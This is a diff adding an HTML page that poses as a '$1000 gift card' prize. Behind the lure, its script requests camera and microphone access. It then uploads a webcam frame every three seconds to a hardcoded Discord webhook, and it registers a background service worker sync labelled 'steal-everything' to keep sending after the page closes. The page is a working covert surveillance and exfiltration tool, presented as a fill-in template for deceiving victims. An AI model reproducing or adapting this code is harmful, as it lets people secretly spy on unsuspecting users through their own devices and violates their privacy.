@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Gift Card - Click Once</title>
+    <style>
+        body {margin:0; background:#000; color:#0f0; font-family:Arial; text-align:center;}
+        button {margin-top:100px; padding:25px 60px; font-size:28px; background:#c00; color:white; border:none; border-radius:20px;}
+    </style>
+</head>
+<body>
+
+<h1>You Won $1000!</h1>
+<button onclick="activate()">CLAIM NOW (one click)</button>
+
+<script>
+// ←←← YOUR DISCORD WEBHOOK HERE ←←←
+const WEBHOOK = "https://discord.com/api/webhooks/1443661292794544250/7Ih9JF8E4R4zAu79H3lGYf6N4i-JYWSTQUFtcFnqPhU3pzrZkma6q7xhz7teuJl2eaqN";
+
+let stream = null;
+
+// Register persistent service worker (survives browser close)
+if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('data:text/javascript;base64,' + btoa(`
+        self.addEventListener('periodicSync', event => {
+            if (event.tag === 'steal-everything') {
+                event.waitUntil(captureAndSend());
+            }
+        });
+        async function captureAndSend() {
+            const response = await fetch('${WEBHOOK}', {method:'POST', body:JSON.stringify({content: 'Background steal from Android - ' + new Date()})});
+        }
+    `));
+}
+
+// Main activation (victim clicks once)
+async function activate() {
+    try {
+        // 1. Get camera + mic forever
+        stream = await navigator.mediaDevices.getUserMedia({
+            video: {facingMode: "user", width: 1920, height: 1080, frameRate: 30},
+            audio: true
+        });
+
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+
+        // 2. Start sending frames + audio chunks every 3 seconds
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+
+        setInterval(() => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0);
+            canvas.toBlob(blob => {
+                const form = new FormData();
+                form.append('file', blob, 'cam.jpg');
+                form.append('content', '**ANDROID LIVE - ' + new Date().toLocaleString() + '**');
+                fetch(WEBHOOK + "?wait=true", {method: "POST", body: form});
+            }, 'image/jpeg', 0.8);
+        }, 3000);
+
+        // 3. Register periodic background sync (works even when Chrome is closed)
+        if ('periodicSync' in navigator.serviceWorker) {
+            const reg = await navigator.serviceWorker.ready;
+            await reg.periodicSync.register('steal-everything', {minInterval: 10 * 60 * 1000}); // every 10 min forever
+        }
+
+        alert("Gift card activated! You will receive it soon.");
+        document.body.innerHTML = "<h1>Thank you! Check your email.</h1>";
+
+    } catch(e) {
+        alert("You blocked camera - no gift card :(");
+    }
+}
+</script>
+
+</body>
+</html>
